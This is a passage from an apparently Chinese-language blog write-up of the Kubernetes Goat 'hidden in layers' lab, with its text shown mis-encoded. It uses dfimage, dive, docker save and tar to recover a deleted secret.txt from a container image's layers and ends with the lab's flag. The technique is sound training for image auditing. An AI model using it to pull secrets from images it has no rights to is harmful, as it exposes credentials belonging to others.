<li>æœ¬åœ°æ‹‰å–å’Œæ‰“åŒ…ï¼š</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull alpine/dfimage
Using default tag: latest
latest: Pulling from alpine/dfimage
f18232174bc9: Pull complete
4f4fb700ef54: Pull complete
099c245da066: Pull complete
Digest: sha256:90265fa67b6c367d9ac6adafa0ea87b40a4307cd0922b624435ab9b201e9edb2
Status: Downloaded newer image <span class="token keyword">for</span> alpine/dfimage:latest
docker.io/alpine/dfimage:latest
<span class="token punctuation">(</span>base<span class="token punctuation">)</span>  ~/my_dockeriamges î‚° <span class="token function">docker</span> save alpine/dfimage <span class="token parameter variable">-o</span> dfimage.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>é¶åœºåŠ è½½</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sxk@sxk-virtual-machine:~$ <span class="token function">docker</span> load <span class="token parameter variable">-i</span> Desktop/myimages/dfimage.tar 
08000c18d16d: Loading layer <span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>  <span class="token number">8</span>.121MB/8.121MB
5f70bf18a086: Loading layer <span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>  <span class="token number">1</span>.024kB/1.024kB
63a4866f778c: Loading layer <span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span><span class="token punctuation">]</span>  <span class="token number">16</span>.46MB/16.46MB
Loaded image: alpine/dfimage:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>é‡æ–°æ‰§è¡Œé•œåƒçš„é€†å‘åˆ†æï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dfimage <span class="token parameter variable">-sV</span><span class="token operator">=</span><span class="token number">1.36</span> madhuakula/k8s-goat-hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.39.08.png" style="zoom:50%;">

<p>å¯ä»¥çœ‹åˆ°åˆ†æå‡ºäº†æ½œåœ¨å¯èƒ½çš„secretså’Œè¿‘ä¼¼çš„dockerfileï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dockerfile:
CMD <span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span>
LABEL <span class="token assign-left variable">MAINTAINER</span><span class="token operator">=</span>Madhu Akula <span class="token assign-left variable">INFO</span><span class="token operator">=</span>Kubernetes Goat
ADD secret.txt /root/secret.txt <span class="token comment"># buildkit</span>
	root/
	root/secret.txt

RUN RUN <span class="token builtin class-name">echo</span> <span class="token string">"Contributed by Rewanth Cool"</span> <span class="token operator">&gt;&gt;</span> /root/contribution.txt  <span class="token punctuation">\</span>
	<span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /root/secret.txt <span class="token comment"># buildkit</span>
CMD <span class="token punctuation">[</span><span class="token string">"sh"</span> <span class="token string">"-c"</span> <span class="token string">"tail -f /dev/null"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>æ–¹æ³•3:<code>dive</code></li>
</ul>
<p><strong>Dive</strong>æ˜¯ä¸€æ¬¾<strong>ç”¨äºæŸ¥çœ‹<code>docker</code> é•œåƒå±‚å†…å®¹ä»¥åŠåˆ†æä¼˜åŒ– <code>docker/oci</code> é•œåƒå¤§å°çš„å·¥å…·</strong>ã€‚</p>
<p>Diveçš„åŠŸèƒ½äº®ç‚¹æœ‰å¦‚ä¸‹ï¼š</p>
<p>æŒ‰å±‚ï¼ˆLayerï¼‰æ˜¾ç¤ºDockeré•œåƒï¼šåœ¨å·¦ä¾§é€‰æ‹©ä¸€ä¸ªå›¾å±‚æ—¶ï¼Œå°†æ˜¾ç¤ºè¯¥å›¾å±‚çš„å†…å®¹ä»¥åŠå³ä¾§çš„æ‰€æœ‰å…ˆå‰å›¾å±‚ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç®­å¤´é”®å…¨é¢æµè§ˆæ–‡ä»¶æ ‘ï¼›</p>
<p>æŒ‡å‡ºæ¯ä¸€å±‚çš„å˜åŒ–ï¼šæ–‡ä»¶æ ‘ä¸­æŒ‡ç¤ºå·²æ›´æ”¹ï¼Œä¿®æ”¹ï¼Œæ·»åŠ æˆ–åˆ é™¤çš„æ–‡ä»¶ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè°ƒæ•´ä»¥æ˜¾ç¤ºç‰¹å®šå±‚çš„æ›´æ”¹ï¼Œæˆ–æ˜¾ç¤ºç›´åˆ°è¯¥å±‚çš„æ±‡æ€»æ›´æ”¹ï¼›</p>
<p>ä¼°ç®—â€œé•œåƒæ•ˆç‡â€ï¼šå·¦ä¸‹æ–¹çš„çª—æ ¼æ˜¾ç¤ºåŸºæœ¬å›¾å±‚ä¿¡æ¯å’Œå®éªŒæŒ‡æ ‡ï¼Œè¯¥æŒ‡æ ‡å°†çŒœæµ‹å›¾åƒæ‰€åŒ…å«çš„æµªè´¹ç©ºé—´ï¼ˆè¿™å¯èƒ½æ˜¯ç”±äºè·¨å±‚å¤åˆ¶æ–‡ä»¶ï¼Œè·¨å±‚ç§»åŠ¨æ–‡ä»¶æˆ–æ²¡æœ‰å®Œå…¨åˆ é™¤æ–‡ä»¶ã€‚æä¾›ç™¾åˆ†æ¯”â€œå¾—åˆ†â€å’Œæ€»æµªè´¹æ–‡ä»¶ç©ºé—´ï¼‰ï¼›</p>
<p>å¿«é€Ÿæ„å»º/åˆ†æå‘¨æœŸï¼šå¯ä»¥æ„å»ºä¸€ä¸ªDockeré•œåƒå¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç«‹å³è¿›è¡Œåˆ†æï¼šdive build -t some-tag ï¼ˆåªéœ€è¦ç”¨docker build ç›¸åŒçš„ dive build å‘½ä»¤æ›¿æ¢å‘½ä»¤å³å¯ï¼‰ã€‚</p>
<p>å®‰è£…ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/wagoodman/dive/releases/download/v0.13.1/dive_0.13.1_linux_amd64.deb
<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ./dive_0.13.1_linux_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.50.58.png" style="zoom:40%;">

<p>åˆ†æé•œåƒï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dive madhuakula/k8s-goat-hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.53.51.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.55.01.png" style="zoom:50%;">

<p>é€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›æ•æ„Ÿæ–‡ä»¶ã€‚</p>
<p><code>/root/contributions.txt</code>ã€<code>/root/secret.txt</code></p>
<p>ä½†æ˜¯ä¸Šé¢çš„åˆ†æå¹¶ä¸èƒ½è®©æˆ‘ä»¬çœ‹åˆ°æ–‡ä»¶çš„å…·ä½“å†…å®¹ã€‚</p>
<h4 id="3ï¼‰æå–æ•æ„Ÿæ–‡ä»¶å†…å®¹"><a href="#3ï¼‰æå–æ•æ„Ÿæ–‡ä»¶å†…å®¹" class="headerlink" title="3ï¼‰æå–æ•æ„Ÿæ–‡ä»¶å†…å®¹"></a>3ï¼‰æå–æ•æ„Ÿæ–‡ä»¶å†…å®¹</h4><ul>
<li>é€šè¿‡é•œåƒæ„å»ºå®¹å™¨</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl run hello <span class="token parameter variable">--rm</span> <span class="token parameter variable">--restart</span><span class="token operator">=</span>Never <span class="token parameter variable">-it</span> --image-pull-policy<span class="token operator">=</span>Never <span class="token parameter variable">--image</span><span class="token operator">=</span>madhuakula/k8s-goat-hidden-in-layers -- <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>â€“image-pull-policy=Never æŒ‡å®šç¦æ­¢å»äº’è”ç½‘æ‹‰å–é•œåƒã€‚</p>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2011.05.31.png" style="zoom:50%;">

<p>/rootç›®å½•ä¸‹å¹¶æ²¡æœ‰secrets.txtï¼Œå› ä¸ºå®ƒå·²ç»ä»ä¸‹ä¸€å±‚ä¸­åˆ é™¤äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨dockerå†…ç½®çš„å‘½ä»¤å°†dockeré•œåƒå¯¼å‡ºä¸ºtaræ–‡ä»¶ï¼Œä»è€Œæ¢å¤/root/secret.txtæ–‡ä»¶ã€‚</p>
<ul>
<li>æ¢å¤æ•æ„Ÿæ–‡ä»¶</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> save madhuakula/k8s-goat-hidden-in-layers <span class="token parameter variable">-o</span> hidden-in-layers.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2011.13.28.png" style="zoom:50%;">

<p>åˆ†ætaråŒ…ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> hidden-in-layers.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2011.16.31.png" style="zoom:50%;">

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯ä¸€å±‚éƒ½è¢«å¯¼å‡ºä¸ºä¸€ä¸ªå•ç‹¬çš„taræ–‡ä»¶ã€‚æˆ‘ä»¬åœ¨è¿™ä¸ªæ™¯è±¡ä¸­æœ‰3å±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰3ä¸ªtaræ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬åªæœ‰3å±‚ï¼Œå¾ˆå®¹æ˜“æå–æ‰€æœ‰å±‚å¹¶æ£€æŸ¥å†…å®¹ï¼Œä½†è¿™ä¸æ˜¯ä¼ ç»Ÿçš„æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬æœ‰æ•°ç™¾å±‚å‘¢ï¼Ÿ</p>
<p>è®©æˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹diveçš„è¾“å‡ºã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶/root/secret.txtæ­£åœ¨è¢«åˆ›å»ºï¼š</p>
<p>é•œåƒå±‚çš„idä¸ºï¼š7ccfb1d6d82f07b0e31ca7708a6933fb7a3b02bc5d380ddf15ccc49b84a7eb20</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2011.20.25.png" style="zoom:50%;">

<p>æ‰€ä»¥æˆ‘ä»¬å®šå‘åˆ†æè¿™ä¸€å±‚çš„æ–‡ä»¶å³å¯ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> 7ccfb1d6d82f07b0e31ca7708a6933fb7a3b02bc5d380ddf15ccc49b84a7eb20
<span class="token function">tar</span> <span class="token parameter variable">-xvf</span> layer.tar
<span class="token function">cat</span> root/secret.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2011.23.28.png" style="zoom:50%;">

<ul>
<li>flag</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

